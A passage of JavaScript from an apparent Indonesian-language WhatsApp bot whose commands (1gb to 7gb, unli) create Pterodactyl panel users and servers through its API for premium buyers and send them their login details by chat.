     renderLargerThumbnail: false
   }
 }, 
 body: proto.Message.InteractiveMessage.Body.create({
   text: tekss1
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
   text: `Success •`
 }),
 header: proto.Message.InteractiveMessage.Header.create({
   title: ``,
   subtitle: "ziyo",
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
   buttons: [
     {
       "name": "cta_copy",
       "buttonParamsJson": `{"display_text":"Username","id":"123456789","copy_code":"${user.username}"}`
     },
{
       "name": "cta_copy",
       "buttonParamsJson": `{"display_text":"Password","id":"123456789","copy_code":"${password}"}`
     },
 {
 name: "cta_url",
 buttonParamsJson: `{"display_text":"Login","url":"${domain}","webview_presentation":null}`,
 },
   ],
 })
 })
 }
 }
}, {});
if (global.setmenu === "v1") {
await ptz.relayMessage(u, msghhhhhhhhh.message, {
 messageId: msghhhhhhhhh.key.id
});
} else if (global.setmenu === "v2") {
ptz.sendMessage(u, {text: ctf})
}
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes

}

break
case "2gb": {
    if (!isPremium) return reply(`Khusus Orang Spesial`)

let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = t[1] + '@s.whatsapp.net'
let name = username + "2GB"
let egg = global.eggsnya
let loc = global.location
let memo = "2048"
let cpu = "70"
let disk = "0"
let email = username + "505@gmail.com"
akunlo = "https://telegra.ph/file/a12558476b9aa179544a0.jpg" 
if (!u) return
let d = (await ptz.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctff = `*${m2}[ Halo kak ${pushname} Ada Panel ]${m2}*

*- ⎙ Data Akun Panel Anda  -*

*• USERNAME* : ${user.username}
*• PASSWORD* : ${password}
*• LOGIN* : ${domain}

*Note* `+readmore+`

[1] *OWNER HANYA MENGIRIM 1X DATA AKUN ANDA*
 MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI

[2] *GARANSI CUMA 1X* 
 KLAIM GARANSI HARUS SEND BUKTI PEMBELIAN

[3] *JANGAN RUN SC DDOS DI PANEL*  
ATAU OWNER AKAN MENGHAPUS AKUN DAN SERVER TANPA REFF
`

let tekss2 = ctff

let msghhhhhhhhhh = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 contextInfo: {
   mentionedJid: [m.sender], 
   isForwarded: false, 
   businessMessageForwardInfo: { businessOwnerJid: ptz.decodeJid(ptz.user.id) },
   externalAdReply: { 
     title: 'Ziyo', 
     thumbnailUrl: 'https://telegra.ph/file/a61add223eb2661c1f38e.jpg', 
     sourceUrl: '',
     mediaType: 2,
     renderLargerThumbnail: false
   }
 }, 
 body: proto.Message.InteractiveMessage.Body.create({
   text: tekss2
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
   text: `Success •`
 }),
 header: proto.Message.InteractiveMessage.Header.create({
   title: ``,
   subtitle: "ziyo",
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
   buttons: [
     {
       "name": "cta_copy",
       "buttonParamsJson": `{"display_text":"Username","id":"123456789","copy_code":"${user.username}"}`
     },
{
       "name": "cta_copy",
       "buttonParamsJson": `{"display_text":"Password","id":"123456789","copy_code":"${password}"}`
     },
 {
 name: "cta_url",
 buttonParamsJson: `{"display_text":"Login","url":"${domain}","webview_presentation":null}`,
 },
   ],
 })
 })
 }
 }
}, {});
if (global.setmenu === "v1") {
await ptz.relayMessage(u, msghhhhhhhhhh.message, {
 messageId: msghhhhhhhhhh.key.id
});
} else if (global.setmenu === "v2") {
ptz.sendMessage(u, {text: ctff})
}
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes

}

break
case "3gb": {
    if (!isPremium) return reply(`Khusus Orang Spesial`)

let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = t[1] + '@s.whatsapp.net'
let name = username + "3GB"
let egg = global.eggsnya
let loc = global.location
let memo = "3072"
let cpu = "100"
let disk = "0"
let email = username + "505@gmail.com"
akunlo = "https://telegra.ph/file/a12558476b9aa179544a0.jpg" 
if (!u) return
let d = (await ptz.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctfff = `*${m2}[ Halo kak ${pushname} Ada Panel ]${m2}*

*- ⎙ Data Akun Panel Anda  -*

*• USERNAME* : ${user.username}
*• PASSWORD* : ${password}
*• LOGIN* : ${domain}

*Note* `+readmore+`

[1] *OWNER HANYA MENGIRIM 1X DATA AKUN ANDA*
 MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI

[2] *GARANSI CUMA 1X* 
 KLAIM GARANSI HARUS SEND BUKTI PEMBELIAN

[3] *JANGAN RUN SC DDOS DI PANEL*  
ATAU OWNER AKAN MENGHAPUS AKUN DAN SERVER TANPA REFF
`

let tekss3 = ctfff

let msghhhhhhhhhhh = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 contextInfo: {
   mentionedJid: [m.sender], 
   isForwarded: false, 
   businessMessageForwardInfo: { businessOwnerJid: ptz.decodeJid(ptz.user.id) },
   externalAdReply: { 
     title: 'Ziyo', 
     thumbnailUrl: 'https://telegra.ph/file/a61add223eb2661c1f38e.jpg', 
     sourceUrl: '',
     mediaType: 2,
     renderLargerThumbnail: false
   }
 }, 
 body: proto.Message.InteractiveMessage.Body.create({
   text: tekss3
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
   text: `Success •`
 }),
 header: proto.Message.InteractiveMessage.Header.create({
   title: ``,
   subtitle: "ziyo",
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
   buttons: [
     {
       "name": "cta_copy",
       "buttonParamsJson": `{"display_text":"Username","id":"123456789","copy_code":"${user.username}"}`
     },
{
       "name": "cta_copy",
       "buttonParamsJson": `{"display_text":"Password","id":"123456789","copy_code":"${password}"}`
     },
 {
 name: "cta_url",
 buttonParamsJson: `{"display_text":"Login","url":"${domain}","webview_presentation":null}`,
 },
   ],
 })
 })
 }
 }
}, {});
if (global.setmenu === "v1") {
await ptz.relayMessage(u, msghhhhhhhhhhh.message, {
 messageId: msghhhhhhhhhhh.key.id
});
} else if (global.setmenu === "v2") {
ptz.sendMessage(u, {text: ctfff})
}


let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes

}
break
case "4gb": {
        if (!isPremium) return reply(`Khusus Orang Spesial`)

let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = t[1] + '@s.whatsapp.net'
let name = username + "4"
let egg = global.eggsnya
let loc = global.location
let memo = "4048"
let cpu = "125"
let disk = "4000"
let email = username + "505@gmail.com"
akunlo = "https://telegra.ph/file/a12558476b9aa179544a0.jpg" 
if (!u) return
let d = (await ptz.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctffff = `*${m2}[ Halo kak ${pushname} Ada Panel ]${m2}*

*- ⎙ Data Akun Panel Anda  -*

*• USERNAME* : ${user.username}
*• PASSWORD* : ${password}
*• LOGIN* : ${domain}

*Note* `+readmore+`

[1] *OWNER HANYA MENGIRIM 1X DATA AKUN ANDA*
 MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI

[2] *GARANSI CUMA 1X* 
 KLAIM GARANSI HARUS SEND BUKTI PEMBELIAN

[3] *JANGAN RUN SC DDOS DI PANEL*  
ATAU OWNER AKAN MENGHAPUS AKUN DAN SERVER TANPA REFF
`

let tekss4 = ctffff

let msghhhhhhhhhhhh = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 contextInfo: {
   mentionedJid: [m.sender], 
   isForwarded: false, 
   businessMessageForwardInfo: { businessOwnerJid: ptz.decodeJid(ptz.user.id) },
   externalAdReply: { 
     title: 'Ziyo', 
     thumbnailUrl: 'https://telegra.ph/file/a61add223eb2661c1f38e.jpg', 
     sourceUrl: '',
     mediaType: 2,
     renderLargerThumbnail: false
   }
 }, 
 body: proto.Message.InteractiveMessage.Body.create({
   text: tekss4
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
   text: `Success •`
 }),
 header: proto.Message.InteractiveMessage.Header.create({
   title: ``,
   subtitle: "ziyo",
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
   buttons: [
     {
       "name": "cta_copy",
       "buttonParamsJson": `{"display_text":"Username","id":"123456789","copy_code":"${user.username}"}`
     },
{
       "name": "cta_copy",
       "buttonParamsJson": `{"display_text":"Password","id":"123456789","copy_code":"${password}"}`
     },
 {
 name: "cta_url",
 buttonParamsJson: `{"display_text":"Login","url":"${domain}","webview_presentation":null}`,
 },
   ],
 })
 })
 }
 }
}, {});
if (global.setmenu === "v1") {
await ptz.relayMessage(u, msghhhhhhhhhhhh.message, {
 messageId: msghhhhhhhhhhhh.key.id
});
} else if (global.setmenu === "v2") {
ptz.sendMessage(u, {text: ctffff})
}
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes

}

break
case "5gb": {
    if (!isPremium) return reply(`Khusus Orang Spesial`)

let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = t[1] + '@s.whatsapp.net'
let name = username + "5GB"
let egg = global.eggsnya
let loc = global.location
let memo = "5138"
let cpu = "150"
let disk = "0"
let email = username + "505@gmail.com"
akunlo = "https://telegra.ph/file/a12558476b9aa179544a0.jpg" 
if (!u) return
let d = (await ptz.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "0011"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctfffff = `*${m2}[ Halo kak ${pushname} Ada Panel ]${m2}*

*- ⎙ Data Akun Panel Anda  -*

*• USERNAME* : ${user.username}
*• PASSWORD* : ${password}
*• LOGIN* : ${domain}

*Note* `+readmore+`

[1] *OWNER HANYA MENGIRIM 1X DATA AKUN ANDA*
 MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI

[2] *GARANSI CUMA 1X* 
 KLAIM GARANSI HARUS SEND BUKTI PEMBELIAN

[3] *JANGAN RUN SC DDOS DI PANEL*  
ATAU OWNER AKAN MENGHAPUS AKUN DAN SERVER TANPA REFF
`

let tekss5 = ctfffff

let msghhhhhhhhhhhhh = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 contextInfo: {
   mentionedJid: [m.sender], 
   isForwarded: false, 
   businessMessageForwardInfo: { businessOwnerJid: ptz.decodeJid(ptz.user.id) },
   externalAdReply: { 
     title: 'Ziyo', 
     thumbnailUrl: 'https://telegra.ph/file/a61add223eb2661c1f38e.jpg', 
     sourceUrl: '',
     mediaType: 2,
     renderLargerThumbnail: false
   }
 }, 
 body: proto.Message.InteractiveMessage.Body.create({
   text: tekss5
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
   text: `Success •`
 }),
 header: proto.Message.InteractiveMessage.Header.create({
   title: ``,
   subtitle: "ziyo",
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
   buttons: [
     {
       "name": "cta_copy",
       "buttonParamsJson": `{"display_text":"Username","id":"123456789","copy_code":"${user.username}"}`
     },
{
       "name": "cta_copy",
       "buttonParamsJson": `{"display_text":"Password","id":"123456789","copy_code":"${password}"}`
     },
 {
 name: "cta_url",
 buttonParamsJson: `{"display_text":"Login","url":"${domain}","webview_presentation":null}`,
 },
   ],
 })
 })
 }
 }
}, {});
if (global.setmenu === "v1") {
await ptz.relayMessage(u, msghhhhhhhhhhhhh.message, {
 messageId: msghhhhhhhhhhhhh.key.id
});
} else if (global.setmenu === "v2") {
ptz.sendMessage(u, {text: ctfffff})
}

let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes

}

break
case "6gb": {
if (!isPremium) return reply(`*Khusus Orang Spesial`)
let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = t[1] + '@s.whatsapp.net'
let name = username 
let egg = global.eggsnya
let loc = global.location
let memo = "6000"
let cpu = "175"
let disk = "6000"
let email = username + "505@gmail.com"
akunlo = "https://telegra.ph/file/a12558476b9aa179544a0.jpg" 
if (!u) return
let d = (await ptz.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "009118"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctffffff = `*${m2}[ Halo kak ${pushname} Ada Panel ]${m2}*

*- ⎙ Data Akun Panel Anda  -*

*• USERNAME* : ${user.username}
*• PASSWORD* : ${password}
*• LOGIN* : ${domain}

*Note* `+readmore+`

[1] *OWNER HANYA MENGIRIM 1X DATA AKUN ANDA*
 MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI

[2] *GARANSI CUMA 1X* 
 KLAIM GARANSI HARUS SEND BUKTI PEMBELIAN

[3] *JANGAN RUN SC DDOS DI PANEL*  
ATAU OWNER AKAN MENGHAPUS AKUN DAN SERVER TANPA REFF
`

let tekss6 = ctffffff

let msghhhhhhhhhhhhhh = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 contextInfo: {
   mentionedJid: [m.sender], 
   isForwarded: false, 
   businessMessageForwardInfo: { businessOwnerJid: ptz.decodeJid(ptz.user.id) },
   externalAdReply: { 
     title: 'Ziyo', 
     thumbnailUrl: 'https://telegra.ph/file/a61add223eb2661c1f38e.jpg', 
     sourceUrl: '',
     mediaType: 2,
     renderLargerThumbnail: false
   }
 }, 
 body: proto.Message.InteractiveMessage.Body.create({
   text: tekss6
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
   text: `Success •`
 }),
 header: proto.Message.InteractiveMessage.Header.create({
   title: ``,
   subtitle: "ziyo",
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
   buttons: [
     {
       "name": "cta_copy",
       "buttonParamsJson": `{"display_text":"Username","id":"123456789","copy_code":"${user.username}"}`
     },
{
       "name": "cta_copy",
       "buttonParamsJson": `{"display_text":"Password","id":"123456789","copy_code":"${password}"}`
     },
 {
 name: "cta_url",
 buttonParamsJson: `{"display_text":"Login","url":"${domain}","webview_presentation":null}`,
 },
   ],
 })
 })
 }
 }
}, {});

if (global.setmenu === "v1") {
await ptz.relayMessage(u, msghhhhhhhhhhhhhh.message, {
 messageId: msghhhhhhhhhhhhhh.key.id
});
} else if (global.setmenu === "v2") {
ptz.sendMessage(u, {text: ctffffff})
}
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes

}

break
case "7gb": {
if (!isPremium) return reply(`Khusus Orang Spesial`)
let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = t[1] + '@s.whatsapp.net'
let name = username 
let egg = global.eggsnya
let loc = global.location
let memo = "7000"
let cpu = "175"
let disk = "7000"
let email = username + "505@gmail.com"
akunlo = "https://telegra.ph/file/a12558476b9aa179544a0.jpg" 
if (!u) return
let d = (await ptz.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "009118"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctfffffff = `*${m2}[ Halo kak ${pushname} Ada Panel ]${m2}*

*- ⎙ Data Akun Panel Anda  -*

*• USERNAME* : ${user.username}
*• PASSWORD* : ${password}
*• LOGIN* : ${domain}

*Note* `+readmore+`

[1] *OWNER HANYA MENGIRIM 1X DATA AKUN ANDA*
 MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI

[2] *GARANSI CUMA 1X* 
 KLAIM GARANSI HARUS SEND BUKTI PEMBELIAN

[3] *JANGAN RUN SC DDOS DI PANEL*  
ATAU OWNER AKAN MENGHAPUS AKUN DAN SERVER TANPA REFF
`

let tekss7 = ctfffffff

let msghhhhhhhhhhhhhhh = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 contextInfo: {
   mentionedJid: [m.sender], 
   isForwarded: false, 
   businessMessageForwardInfo: { businessOwnerJid: ptz.decodeJid(ptz.user.id) },
   externalAdReply: { 
     title: 'Ziyo', 
     thumbnailUrl: 'https://telegra.ph/file/a61add223eb2661c1f38e.jpg', 
     sourceUrl: '',
     mediaType: 2,
     renderLargerThumbnail: false
   }
 }, 
 body: proto.Message.InteractiveMessage.Body.create({
   text: tekss7
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
   text: `Success •`
 }),
 header: proto.Message.InteractiveMessage.Header.create({
   title: ``,
   subtitle: "ziyo",
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
   buttons: [
     {
       "name": "cta_copy",
       "buttonParamsJson": `{"display_text":"Username","id":"123456789","copy_code":"${user.username}"}`
     },
{
       "name": "cta_copy",
       "buttonParamsJson": `{"display_text":"Password","id":"123456789","copy_code":"${password}"}`
     },
 {
 name: "cta_url",
 buttonParamsJson: `{"display_text":"Login","url":"${domain}","webview_presentation":null}`,
 },
   ],
 })
 })
 }
 }
}, {});
if  (global.setmenu === "v1") {
await ptz.relayMessage(u, msghhhhhhhhhhhhhhh.message, {
 messageId: msghhhhhhhhhhhhhhh.key.id
});
} else if (global.setmenu === "v2") {
ptz.sendMessage(u, {text: ctfffffff})
}
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes

}

break
case "unli": {
       if (!isPremium) return reply(`Khusus Orang Spesial`)
let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = t[1] + '@s.whatsapp.net'
let name = username + "Unli"
let egg = global.eggsnya
let loc = global.location
let memo = "0"
let cpu = "0"
let disk = "0"
let email = username + "505@gmail.com"
akunlo = "https://telegra.ph/file/a12558476b9aa179544a0.jpg" 
if (!u) return
let d = (await ptz.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctffffffff = `*${m2}[ Halo kak ${pushname} Ada Panel ]${m2}*

*- ⎙ Data Akun Panel Anda  -*

*• USERNAME* : ${user.username}
*• PASSWORD* : ${password}
*• LOGIN* : ${domain}

*Note* `+readmore+`

[1] *OWNER HANYA MENGIRIM 1X DATA AKUN ANDA*
 MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI

[2] *GARANSI CUMA 1X* 
 KLAIM GARANSI HARUS SEND BUKTI PEMBELIAN

[3] *JANGAN RUN SC DDOS DI PANEL*  
